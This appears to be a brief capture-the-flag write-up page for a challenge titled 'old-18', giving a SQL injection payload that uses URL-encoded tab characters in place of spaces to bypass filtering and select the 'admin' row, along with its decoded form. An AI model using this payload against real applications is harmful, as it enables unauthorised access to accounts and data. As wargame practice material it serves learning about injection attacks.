---
layout: default
title: old-18
---



this challange is SQL injection.
this is the payload: `2%09or%09id%09LIKE%09%27admin%27%09--%09`

if we'll URL-decode this, we'll get this:
`2	or	id	LIKE	'admin'	--`